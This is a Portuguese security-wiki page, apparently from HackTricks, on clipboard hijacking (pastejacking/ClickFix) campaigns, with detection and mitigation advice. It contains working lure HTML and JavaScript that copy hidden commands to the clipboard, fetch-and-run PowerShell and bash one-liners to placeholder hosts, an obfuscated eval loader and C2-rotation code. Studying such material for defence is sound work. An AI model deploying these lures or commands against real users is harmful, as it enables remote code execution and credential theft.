# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca cole nada que você não copiou pessoalmente." – conselho antigo, mas ainda válido

## Visão geral

Clipboard hijacking – também conhecido como *pastejacking* – explora o fato de que usuários rotineiramente copiam e colam comandos sem inspecioná-los. Uma página web maliciosa (ou qualquer contexto com suporte a JavaScript, como uma aplicação Electron ou Desktop) insere programaticamente texto controlado pelo atacante na área de transferência do sistema. As vítimas são incentivadas, normalmente por instruções de engenharia social cuidadosamente elaboradas, a pressionar **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ou abrir um terminal e *paste* o conteúdo da área de transferência, executando imediatamente comandos arbitrários.

Porque **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e conteúdo web que monitoram anexos, macros ou execução direta de comandos. O ataque é, portanto, popular em campanhas de phishing que entregam famílias de malware commodity como NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## Botões de "Copy" forçados e payloads ocultos (macOS one-liners)

Alguns infostealers para macOS clonam sites de instaladores (p.ex., Homebrew) e **forçam o uso de um botão “Copy”** para que os usuários não possam selecionar apenas o texto visível. A entrada na área de transferência contém o comando de instalação esperado mais um payload em Base64 anexado (por exemplo, `...; echo <b64> | base64 -d | sh`), de modo que um único *paste* executa ambos enquanto a UI oculta a etapa extra.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campanhas mais antigas usavam `document.execCommand('copy')`, as mais recentes dependem da assíncrona **Clipboard API** (`navigator.clipboard.writeText`).

## Fluxo ClickFix / ClearFake

1. O usuário visita um site typosquatted ou comprometido (p.ex. `docusign.sa[.]com`)
2. JavaScript **ClearFake** injetado chama um helper `unsecuredCopyToClipboard()` que armazena silenciosamente um comando PowerShell de uma linha codificado em Base64 na área de transferência.
3. Instruções em HTML dizem à vítima: *“Pressione **Win + R**, cole o comando e pressione Enter para resolver o problema.”*
4. `powershell.exe` é executado, baixando um arquivo que contém um executável legítimo mais uma DLL maliciosa (classic DLL sideloading).
5. O loader descriptografa estágios adicionais, injeta shellcode e instala persistência (p.ex. scheduled task) – executando, em última instância, NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemplo de cadeia do NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legítimo Java WebStart) procura em seu diretório por `msvcp140.dll`.
* A DLL maliciosa resolve dinamicamente APIs com **GetProcAddress**, baixa dois binários (`data_3.bin`, `data_4.bin`) via **curl.exe**, descriptografa-os usando uma chave XOR rotativa "https://google.com/", injeta o shellcode final e descompacta **client32.exe** (NetSupport RAT) em `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Baixa `la.txt` com **curl.exe**
2. Executa o downloader JScript dentro de **cscript.exe**
3. Busca um payload MSI → coloca `libcef.dll` ao lado de uma aplicação assinada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
A chamada **mshta** inicia um script PowerShell oculto que recupera `PartyContinued.exe`, extrai `Boat.pst` (CAB), reconstrói `AutoIt3.exe` através de `extrac32` e concatenação de arquivos e finalmente executa um script `.a3x` que exfiltra credenciais de navegador para `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Algumas campanhas ClickFix pulam completamente o download de arquivos e instruem as vítimas a colarem um one‑liner que busca e executa JavaScript via WSH, o mantém persistente e rotaciona o C2 diariamente. Exemplo de cadeia observada:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Principais características
- URL ofuscada invertida em tempo de execução para frustrar inspeção casual.
- JavaScript persiste a si mesmo via um Startup LNK (WScript/CScript), e seleciona o C2 pelo dia corrente – permitindo rápida rotação de domínios.

Fragmento JS mínimo usado para rotacionar C2s por data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
A próxima etapa normalmente implanta um loader que estabelece persistência e baixa um RAT (p.ex., PureHVNC), muitas vezes fixando TLS a um certificado codificado e fragmentando o tráfego.

Ideias de detecção específicas para esta variante
- Árvore de processos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Artefatos de inicialização: LNK em `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invocando WScript/CScript com um caminho JS sob `%TEMP%`/`%APPDATA%`.
- Registro/RunMRU e telemetria de linha de comando contendo `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Repetidos `powershell -NoProfile -NonInteractive -Command -` com grandes payloads via stdin para alimentar scripts longos sem linhas de comando extensas.
- Scheduled Tasks que subseqüentemente executam LOLBins como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sob uma tarefa/caminho com aparência de updater (p.ex., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostnames e URLs de C2 rotativos diariamente com padrão `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacione eventos de escrita no clipboard seguidos por colagem via Win+R e execução imediata de `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantém um histórico de **Win + R** – procure por entradas Base64 / ofuscadas incomuns.
* Security Event ID **4688** (Process Creation) onde `ParentImage` == `explorer.exe` e `NewProcessName` em { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para criações de arquivos sob `%LocalAppData%\Microsoft\Windows\WinX\` ou pastas temporárias imediatamente antes do evento 4688 suspeito.
* EDR clipboard sensors (se presentes) – correlacione `Clipboard Write` seguido imediatamente por um novo processo PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campanhas recentes produzem em massa páginas falsas de verificação CDN/browser ("Just a moment…", IUAM-style) que forçam usuários a copiar comandos específicos do OS do clipboard para consoles nativos. Isso pivota a execução para fora do browser sandbox e funciona tanto em Windows quanto em macOS.

Características chave das páginas geradas pelo builder
- Detecção de OS via `navigator.userAgent` para adaptar payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops opcionais para OS não suportados para manter a ilusão.
- Cópia automática para o clipboard em ações benignas da UI (checkbox/Copy) enquanto o texto visível pode diferir do conteúdo real do clipboard.
- Bloqueio móvel e um popover com instruções passo a passo: Windows → Win+R→paste→Enter; macOS → abrir Terminal→paste→Enter.
- Ofuscação opcional e um single-file injector para sobrescrever o DOM de um site comprometido com uma UI de verificação estilizada com Tailwind (sem necessidade de registrar um novo domínio).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistência no macOS da execução inicial
- Utilize `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que a execução continue após o terminal ser fechado, reduzindo artefatos visíveis.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideias de detecção & hunting específicas para IUAM-style lures
- Web: Páginas que vinculam Clipboard API a widgets de verificação; discrepância entre o texto exibido e o clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace em contextos suspeitos.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` pouco depois de uma interação do browser; instaladores batch/MSI executados a partir de `%TEMP%`.
- macOS endpoint: Terminal/iTerm iniciando `bash`/`curl`/`base64 -d` com `nohup` próximo a eventos do browser; background jobs que sobrevivem ao fechamento do terminal.
- Correlate `RunMRU` Win+R history e clipboard writes com a criação subsequente de processos de console.

Veja também para técnicas de suporte

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigações

1. Endurecimento do browser – desabilitar clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) ou exigir user gesture.
2. Conscientização de segurança – ensinar usuários a *digitar* comandos sensíveis ou colá-los primeiro em um editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrários.
4. Controles de rede – bloquear requisições outbound para domínios conhecidos de pastejacking e malware C2.

## Truques Relacionados

* **Discord Invite Hijacking** frequentemente abusa da mesma abordagem ClickFix após atrair usuários para um servidor malicioso:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referências

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
